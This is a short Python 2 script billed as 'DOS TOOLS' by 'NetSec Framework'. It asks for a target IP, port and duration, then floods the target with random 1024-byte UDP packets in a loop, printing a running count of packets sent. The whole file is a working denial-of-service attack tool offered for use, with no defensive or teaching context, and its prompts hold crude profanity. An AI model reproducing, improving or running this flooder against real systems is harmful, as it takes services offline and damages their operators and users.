import os
import sys
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1024)

os.system("clear")
os.system("figlet DOS TOOLS")
print("TEAM     : NetSec Framework")
print("CREATE :       PAK3SEC")
print("EMAIL   :  netsecf@gmail.com     ")
print ("")
ip = raw_input("IP BABI ANJIM:")
port = input("PORT ANJING :")
dur = input("Jumlah Attack : ")
timeout = time.time() + dur
sent = 0

while True:
        try:
                 if time.time() > timeout:
                        break
                 else:
                        pass
                 sock.sendto(bytes,(ip, port))
                 sent = sent + 1
                 print "%s BITCH FUCK FOR %s ATTACK TO %s"%(sent, ip, port)
        except KeyboardInterrupt:
                sys.exit()
